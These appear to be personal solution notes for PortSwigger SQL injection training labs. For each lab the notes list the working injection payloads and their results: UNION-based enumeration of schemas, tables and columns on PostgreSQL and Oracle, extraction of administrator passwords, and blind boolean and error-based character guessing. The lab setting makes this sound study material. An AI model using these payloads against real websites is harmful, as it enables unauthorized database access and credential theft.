[Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
filter?category=Gifts' or 1=1--
```
[Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
```sql
\'or 1=1--
```
[Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
```sql
Accessories' UNION SELECT banner , 'def' FROM v$version --' 
```
[Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
```sql
category=Pets'+UNION+SELECT+@@version,NULL-- true
category=Pets'+UNION+SELECT+@@version,database()-- true

category=Pets' UNION SELECT database(),group_concat(table_name) from information_schema.tables where table_schema=database()-- true 
-->products
echo level6 | xxd  -->00000000: 7072 6f64 7563 7473 0a products.

category=Pets' UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x70726f6475637473--  -->error

category=Pets' UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x70726f6475637473-- true 
-->category,description,id,image,name,price,rating,released

category=Pets' UNION SELECT name,description FROM products-- true
```
[Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
```sql
category=Pets'+and+1=1-- true
category=Pets'+order+by+2-- true
category=Pets' UNION SELECT NULL, NULL --true

category=Pets' UNION SELECT database(), NULL --false
category=Pets' UNION SELECT version(), NULL --true
	PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc   (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

category=Pets'+UNION+SELECT+current_database(), NULL --true
	academy_labs

category=Pets' UNION SELECT schema_name, NULL FROM information_schema.schemata --
	pg_catalog
	public
	information_schema

category=Pets' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'--
	users_iuwgkn
	products

category=Pets' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_iuwgkn'--
	email
	password_zbvpyh
	username_loomax

category=Pets' UNION SELECT username_loomax , password_zbvpyh FROM users_iuwgkn--
	administrator
	vd7ve06l52wppzvritwb(password no hash)
```
[Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
```sql
category=Lifestyle' order by 2--true

category=Lifestyle' UNION SELECT global_name , NULL FROM global_name --'
	XE

category=Lifestyle' UNION SELECT username,NULL FROM all_users-- 
	many
category=Lifestyle' UNION SELECT user,NULL FROM dual--
	PETER

category=Lifestyle' UNION SELECT table_name,NULL FROM all_tables WHERE owner='PETER'--
	PRODUCTS
	USERS_OFFLZH

category=Lifestyle' UNION SELECT column_name,NULL FROM all_tab_columns WHERE owner='PETER' AND table_name='USERS_OFFLZH'--
	EMAIL
	PASSWORD_LWHLOO
	USERNAME_YBKZKH
	
category=Lifestyle' UNION SELECT USERNAME_YBKZKH,PASSWORD_LWHLOO FROM PETER.USERS_OFFLZH--
	administrator
	8lzrf4tzj6wpamrc12x6
```
[Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
```sql
category=Gifts' UNION SELECT NULL,NULL,NULL --
```
[Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
```SQL
category=Gifts' UNION SELECT 'gxwB13',NULL,NULL --500
category=Gifts' UNION SELECT NULL,'gxwB13',NULL --200
```
[Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
```SQL 
--category=Lifestyl
' order by 2--
' UNION+SELECT+version(),NULL--
--PostgreSQL 12.22
' UNION SELECT current_database(),NULL--
-- academy_labs
' UNION SELECT schema_name, NULL FROM information_schema.schemata --
--public
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'--
-- products   ,  users
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users'--
-- email    ,   password     ,   username
' UNION SELECT username , password FROM users --
-- administrator    ->   dwd1ynj7pn2ibps3mf3v
```
[Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
```sql
portgresql(burp_suite)
' UNION SELECT NULL,current_database()--true
-- academy_labs
' UNION SELECT NULL,schema_name FROM information_schema.schemata --
-- public
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema = 'public'--
-- users   ,   products
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users'--
-- email    ,   password     ,   username
' UNION SELECT username , password FROM users --FALSE(500)
' UNION SELECT NULL,username||'~'||password FROM users--
-- administrator~dwd1ynj7pn2ibps3mf3v
```
[Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
```sql
' and '1'='1--true
' and '1'='2--false

' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 1--
...
' AND (SELECT SUBSTRING(password,21,1) FROM users WHERE username='administrator')='$a$'---
--(burp
cluster bomb attack --->payloads ...
)
...
```
[Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
```sql
#oracle
login
TrackingId -->invalid (abc)
' ->E
' AND 1=1 --true
' AND 1=0 --true

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a' --login (' AND 'a' ='a' --)
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a' --error ->true
' AND (SELECT CASE WHEN LENGTH(password) >19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ='a' --error ->true
' AND (SELECT CASE WHEN LENGTH(password) >20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') ='a' --login (LENGTH(password)=20)
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --

' AND (SELECT CASE WHEN SUBSTR(password,$1$,1)='$4$' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --(burp)
----------------------------------------------------------------------------------------
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual)='a' --login-->true
```
[Lab: Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
